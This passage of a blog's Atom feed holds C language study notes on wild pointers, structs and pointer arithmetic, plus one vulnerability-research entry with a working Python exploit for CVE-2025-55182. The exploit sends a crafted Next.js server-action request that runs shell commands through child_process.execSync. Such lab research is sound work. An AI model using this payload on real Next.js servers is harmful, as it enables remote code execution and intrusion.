            <link href="https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/" >
        </entry>
        <entry>
            <title>
                CVE-2025-55182 漏洞研究
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/</id>
            <content type="html">
                &lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;cd my-app/
npm run dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打開 &lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;攻擊程式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# refrence: https://github.com/msanft/CVE-2025-55182

import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) &amp;gt; 1 else &amp;quot;http://localhost:3000&amp;quot;
EXECUTABLE = sys.argv[2] if len(sys.argv) &amp;gt; 2 else &amp;quot;id&amp;quot;

crafted_chunk = {
    &amp;quot;then&amp;quot;: &amp;quot;$1:__proto__:then&amp;quot;,
    &amp;quot;status&amp;quot;: &amp;quot;resolved_model&amp;quot;,
    &amp;quot;reason&amp;quot;: -1,
    &amp;quot;value&amp;quot;: &#39;{&amp;quot;then&amp;quot;: &amp;quot;$B0&amp;quot;}&#39;,
    &amp;quot;_response&amp;quot;: {
        &amp;quot;_prefix&amp;quot;: f&amp;quot;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;,{{&#39;timeout&#39;:5000}}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {{digest:`${{res}}`}});&amp;quot;,
        # If you don&#39;t need the command output, you can use this line instead:
        # &amp;quot;_prefix&amp;quot;: f&amp;quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;);&amp;quot;,
        &amp;quot;_formData&amp;quot;: {
            &amp;quot;get&amp;quot;: &amp;quot;$1:constructor:constructor&amp;quot;,
        },
    },
}

files = {
    &amp;quot;0&amp;quot;: (None, json.dumps(crafted_chunk)),
    &amp;quot;1&amp;quot;: (None, &#39;&amp;quot;$@0&amp;quot;&#39;),
}

headers = {&amp;quot;Next-Action&amp;quot;: &amp;quot;x&amp;quot;}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/" >
        </entry>
        <entry>
            <title>
                野指針
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818215631.png&quot; alt=&quot;Pasted image 20250818215631.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int *p;
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p);
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改未初始化的指針變數的值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int *p;
    *p = 10; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 11;
    int *p;
    *p = num; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;code-bus-error-10-code&quot; tabindex=&quot;-1&quot;&gt;&lt;code&gt;Bus error: 10&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;是在 &lt;strong&gt;Unix-like 系統（像 macOS、Linux）&lt;/strong&gt; 上常見的錯誤訊息。代表程式嘗試存取 &lt;strong&gt;無效的記憶體位址&lt;/strong&gt; 或 &lt;strong&gt;不符合對齊規則的記憶體位址&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在 macOS 上特別常見，因為它的記憶體對齊要求比較嚴格。&lt;/p&gt;
&lt;h3 id=&quot;原因&quot; tabindex=&quot;-1&quot;&gt;原因&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;指標錯誤使用&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;指標指向無效的記憶體位置（例如已經 &lt;code&gt;free&lt;/code&gt; 過，或是從未正確初始化）。&lt;/li&gt;
&lt;li&gt;指標運算錯誤，導致存取到錯誤位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;指針越界訪問&quot; tabindex=&quot;-1&quot;&gt;指針越界訪問&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818222350.png&quot; alt=&quot;Pasted image 20250818222350.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[1]); // 3
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[1]); // 0x16bc9eab4
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[2]); // 5
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[2]); // 0x16bc9eab8
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[99]); // 0 &amp;lt;- 野指針，無法預測這裡的值
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[99]); // 0x16bc9ec3c &amp;lt;- 野指針地址，無法預測這裡的值
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;野指針 2:&lt;br /&gt;
以 for loop 方式越界訪問&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    for (int i = 0; i &amp;lt; 10; i++){
        printf(&amp;quot;index: %d, value: %d&#92;n&amp;quot;, i, arr[i]);
    }
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2

/* 
output:
index: 0, value: 1
index: 1, value: 3
index: 2, value: 5
index: 3, value: 7
index: 4, value: 9
index: 5, value: 1
index: 6, value: -1657536328
index: 7, value: -1157789503
index: 8, value: 1836167456
index: 9, value: 1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    int *p = arr; // 賦值 &amp;amp;arr[0]
    for (int i = 0; i &amp;lt; 10; i++){
        printf(&amp;quot;%d&#92;n&amp;quot;, *p++); // 地址先 +1 個 int 單位(4 個 bytes = 32 bits)
    }
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
/*
output:
1
3
5
7
9
1
525336608
-509251205
1865920800
1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;訪問已回收的地址&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int *test(){
    int a = 15; // 局部變數
    // 返回變數 a 的地址
    return &amp;amp;a;
}

void dummy_function(){
    int x = 999, y = 888, z = 777; // 故意覆蓋 stack
    printf(&amp;quot;dummy function called&#92;n&amp;quot;);
}

int main(){
	// 因為 p2 指向一個可能會被回收掉的地址，所以就產生一個野指針
    int *p2 = test();
    printf(&amp;quot;第一次讀取: %d&#92;n&amp;quot;, *p2);
    
    dummy_function(); // 覆蓋 stack
    
    printf(&amp;quot;第二次讀取: %d&#92;n&amp;quot;, *p2); // 讀到垃圾值
    return 0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2

/*
output:
	第一次讀取: 15
	dummy function called
	第二次讀取: 1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;避免野指針&quot; tabindex=&quot;-1&quot;&gt;避免野指針&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818231729.png&quot; alt=&quot;Pasted image 20250818231729.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212325.png&quot; alt=&quot;Pasted image 20250819212325.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/" >
        </entry>
        <entry>
            <title>
                聲明結構體練習
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

/*結構體傳參*/
// 聲明一個結構體
struct Node
{
    int data;
    struct Node *next; // 指向 Node 型變數的指針
};

// 或是如下定義
typedef struct Node1
{
    int data;
    struct Node *next;
}LNode;

// 聲明二叉樹的節點
// 方式 1
struct BTNode
{
    int data;
    struct BTNode *lchild; // 指向左子樹
    struct BTNode *rchild; // 指向右子樹
    
};

// 方式 2
typedef struct BTNode1
{
    int data;
    struct BTNode1 *lchild; // 指向左子樹
    struct BTNode1 *rchild; // 指向右子樹
    
}BTNode1;


// 結構體指針
int main()
{
    // 聲明節點變量的不同方式
    // 方式 1:
    // 聲明單向鍊表的節點
    struct Node node1;
    LNode node2;
    
    // 聲明二叉樹的節點
    struct BTNode btnode1;
    BTNode1 btnode2;
    
    // 方式 2:
    BTNode1 *node5;

    // 動態開闢 BTNode1 大小的空間
    // (BTNode1 *) 強制轉型為 BTNode1 類型
    node5 = (BTNode1 *)malloc(sizeof(BTNode1));
    free(node5); // 釋放 node5 空間
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/" >
        </entry>
        <entry>
            <title>
                結構體訪問 - 課後練習
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/</id>
            <content type="html">
                &lt;p&gt;題目:&lt;br /&gt;
輸入班級所有學生的成績，輸出成績高於平均的學生姓名與分數&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#define&quot;&gt;#define&lt;/a&gt; LENGTH 4
// 需求: 輸入班級學生訊息
struct Student
{
    int id;
    char name[20];
    char gender;
    int score;
};

int main()
{
    // 聲明學生的結構體數組
    struct Student student_arr[LENGTH] = {{.id=1, .name=&amp;quot;alice&amp;quot;, .gender=&#39;M&#39;, .score=60},
                                          {.id=2, .name=&amp;quot;bob&amp;quot;, .gender=&#39;F&#39;, .score=65},
                                          {.id=3, .name=&amp;quot;hoho&amp;quot;, .gender=&#39;F&#39;, .score=70},
                                          {.id=4, .name=&amp;quot;doe&amp;quot;, .gender=&#39;M&#39;, .score=80}};
    int score_sum = 0;
    for (int i = 0; i &amp;lt; LENGTH; i++){
        printf(&amp;quot;score: %d&#92;n&amp;quot;, student_arr[i].score);
        score_sum += student_arr[i].score;
    }
    int avg_score = score_sum/LENGTH;
    printf(&amp;quot;avg_score: %d&#92;n&amp;quot;, avg_score);
    for (int i = 0; i &amp;lt; LENGTH; i++){
        if (student_arr[i].score &amp;gt; avg_score){
            printf(&amp;quot;name: %s, score: %d&#92;n&amp;quot;, student_arr[i].name, student_arr[i].score);
        }
    }
}

output: 
	score: 60
	score: 65
	score: 70
	score: 80
	avg_score: 68
	name: hoho, score: 70
	name: doe, score: 80
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/" >
        </entry>
        <entry>
            <title>
                結構體複製 - pass by value
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Car
{
    char name[30];
    double price;
} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};

int main()
{
    // 複製行為
    struct Car  b = a; // 結構體複製是 pass by value
    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同

    printf(&amp;quot;a =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, a.name, a.price); // 值是一樣
    printf(&amp;quot;b =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, b.name, b.price); // 值是一樣
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;結構體的複製是 pass by value&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830153021.png&quot; alt=&quot;Pasted image 20250830153021.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;&lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出的是自己的變數地址&lt;br /&gt;
printf(&amp;quot;%p&#92;n&amp;quot;, &lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出指針變數指向的變數地址&lt;/p&gt;
&lt;p&gt;在 C 語言中，字符串屬於常量，只要定義一個字符串 &amp;quot;Hello&amp;quot;, 不管後續誰指向，都是指到同個記憶體位置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Car
{
    char *name;
    double price;
} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};

int main()
{
    // 複製行為
    struct Car  b = a; // 結構體複製是 pass by value，會產生新地址
    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同

    /*
    結構體本身複製的是值，當值是指針變數時，複製的是該指針變數指向的地址
    */
    printf(&amp;quot;a =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;a.name, &amp;amp;a.price); // &amp;amp;a.name 顯示指針變數的地址 a =&amp;gt; name: 0x102480000, price: 0x102480008
    printf(&amp;quot;b =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;b.name, &amp;amp;b.price); // &amp;amp;b.name 顯示指針變數的地址 b =&amp;gt; name: 0x16d986a10, price: 0x16d986a18
    printf(&amp;quot;a =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, a.name, a.price); // a.name 指向的變數地址 a =&amp;gt; name: 0x102478600, price: 100.000000
    printf(&amp;quot;b =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, b.name, b.price); // b.name 指向的變數地址 b =&amp;gt; name: 0x102478600, price: 100.000000
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/" >
        </entry>
        <entry>
            <title>
                結構體數組訪問
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Person
{
    char name[20];
    int age;
};

int main()
{
    // 1. 創建結構體數組
    struct Person p_arr[5];

    // 2. 如何給結構體數組的元素賦值    
    strcpy(p_arr[0].name, &amp;quot;Jason&amp;quot;);
    p_arr[0].age = 5;
    strcpy(p_arr[1].name, &amp;quot;Jason111&amp;quot;);
    p_arr[0].age = 6;
    strcpy(p_arr[2].name, &amp;quot;Jason222&amp;quot;);
    p_arr[0].age = 7;
    //3. 如何調用數組的元素，即結構體內部的成員

    printf(&amp;quot;p_arr[0].name: %s&#92;n&amp;quot;, p_arr[0].name);
    printf(&amp;quot;p_arr[1].name: %s&#92;n&amp;quot;, p_arr[1].name);
    printf(&amp;quot;p_arr[2].name: %s&#92;n&amp;quot;, p_arr[2].name);

    /*聲明方式 2*/
    // 1. 創建結構體數組
    struct Person p_arr2[]={ {.name=&amp;quot;John&amp;quot;, .age=1},
                            {.name=&amp;quot;John1&amp;quot;, .age=2},
                            {.name=&amp;quot;Joh2&amp;quot;, .age=3}};

    printf(&amp;quot;p_arr2[0].name: %s&#92;n&amp;quot;, p_arr2[0].name);
    printf(&amp;quot;p_arr2[1].name: %s&#92;n&amp;quot;, p_arr2[1].name);
    printf(&amp;quot;p_arr2[2].name: %s&#92;n&amp;quot;, p_arr2[2].name);
    
    /*使用指向數組的指針*/
    struct Person *ptrPerson;
    
    // 取得第 0 個結構體的指針參考
    ptrPerson = &amp;amp;p_arr[0];
    printf(&amp;quot;ptrPerson.name: %s&#92;n&amp;quot;, ptrPerson-&amp;gt;name);
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/" >
        </entry>
        <entry>
            <title>
                結構體指針變數傳遞
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
/*結構體傳參*/
// 聲明一個結構體
struct Person
{
   char name[20];
   int age;
};

void addAge(struct Person per){
    // 實際傳入的是結構體的副本
    per.age = per.age + 1;
}
void addAge1(struct Person *per){
    // 修改的是指針裡面的值
    per-&amp;gt;age = per-&amp;gt;age + 1;
}

// 結構體指針
int main()
{
    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=13};
    // 實際傳入的是結構體的副本，pass by value
    addAge(per1);
    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);

    // 傳入結構體的指針，pass by reference
    addAge1(&amp;amp;per1);
    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/" >
        </entry>
        <entry>
            <title>
                結構體指針變數使用
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

// 聲明一個結構體
struct Person
{
   char name[20];
   int age;
};

// 結構體指針
int main()
{
    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=12};
    struct Person *per_ptr = &amp;amp;per1;

    // 兩者等價
    (*per_ptr).age = 20;
    per_ptr-&amp;gt;age = 30;

    printf(&amp;quot;name: %s&#92;n&amp;quot;, (*per_ptr).name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, (*per_ptr).age);
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/" >
        </entry>
        <entry>
            <title>
                結構體指針傳遞練習題 1
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
/*結構體傳參*/
// 聲明一個結構體
struct Dog
{
   char name[20];
   int age;
   double weight;
};

// 只能在這邊聲明返回指針
// 陣列在表達式中會自動轉換為指針
char *say(struct Dog dog){
    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, dog.name, dog.age, dog.weight);
    return info; //實際是返回陣列的[0] 位置的指針
}

// 方式 2, 指針傳遞
char *say1(struct Dog *dog_ptr){
    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
    (*dog_ptr).age = (*dog_ptr).age + 1;
    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, (*dog_ptr).name, (*dog_ptr).age, (*dog_ptr).weight);
    return info; //實際是返回陣列的[0] 位置的指針
}

// 結構體指針
int main()
{
    // 聲明結構體變量，並初始化
    struct Dog myDog;
    strcpy(myDog.name, &amp;quot;大黃&amp;quot;);
    myDog.age = 2;
    myDog.weight = 2.3;

    char *result = say(myDog);
    printf(&amp;quot;info=%s&#92;n&amp;quot;, result);

    char *result2 = say1(&amp;amp;myDog);
    printf(&amp;quot;info=%s&#92;n&amp;quot;, result2);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/" >
        </entry>
        <entry>
            <title>
                數組反轉操作
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

int main()
{
    // 一維數組反轉操作
    int arr[] = {0,1,2,3,4,5,6,7,8,9};   
    size_t LENGTH = sizeof(arr) / sizeof(int);
    int tmp = 0;
    // for (int i=0; i &amp;lt; (LENGTH/2); i++)
    // {
    //     tmp = arr[i];
    //     arr[i] = arr[LENGTH-1-i];
    //     arr[LENGTH-1-i] = tmp;
    // }
    
    // 反轉實現方式 2
    for (int left = 0, right = LENGTH-1;left &amp;lt; right;left++, right--)
    {
        int tmp = arr[left];
        arr[left] = arr[right];
        arr[right] = tmp;
    }
    for (int i=0; i &amp;lt; LENGTH; i++)
    {
        printf(&amp;quot;--%d&#92;n&amp;quot;, arr[i]);
    }
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/" >
        </entry>
        <entry>
            <title>
                指針的自增自減運算
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 2, 3, 4, 5};

    // 以下兩種寫法相等
    // int *p = arr; // 取 arr 首地址存入 pointer p
    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p
    p++; // 使 p 指向下一個元素
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
    return  0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171509.png&quot; alt=&quot;Pasted image 20250818171509.png&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171526.png&quot; alt=&quot;Pasted image 20250818171526.png&quot; /&gt;&lt;br /&gt;
運算子結合是由右往左結合&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9};

    // 以下兩種寫法相等
    // int *p = arr; // 取 arr 首地址存入 pointer p
    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p -&amp;gt; 1
    p++; // 使 p 指向下一個元素 -&amp;gt; 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p++); //取值後輸出，並往後移動 4 個 bit -&amp;gt; 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 重新取用一次 p 的值 -&amp;gt; 5
